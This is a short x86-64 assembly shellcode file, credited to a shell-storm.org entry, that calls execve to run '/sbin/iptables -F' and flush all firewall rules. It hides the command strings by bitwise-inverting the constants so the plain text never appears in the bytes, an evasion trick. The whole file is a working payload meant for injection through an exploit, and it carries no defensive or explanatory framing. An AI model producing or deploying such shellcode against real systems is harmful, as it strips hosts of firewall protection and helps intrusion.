BITS 64
; Original shellcode written by 10n1z3d
; http://shell-storm.org/shellcode/files/shellcode-683.php
global _start

section .text

_start:
    ;push    word 0x462d ; -F
    xor ax, ax
    push ax
    mov ax, 0xb9d2
    not ax
    push ax
    xor     rax, rax
    mov     rcx, rsp ; rcx points to -F
    cdq
     
    mov     rbx, 0xffff8c9a939d9e8b ; tables
    not rbx
    push    rbx
    mov     rbx, 0x8f96d091969d8cd0 ; /sbin/ip
    not rbx
    push    rbx
    mov     rdi, rsp ; rdi points to /sbin/iptables
     
    push    rdx ; 0
    push    rcx
    push    rdi
    mov     rsi, rsp
     
    ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
    mov     al, 0x3b
    syscall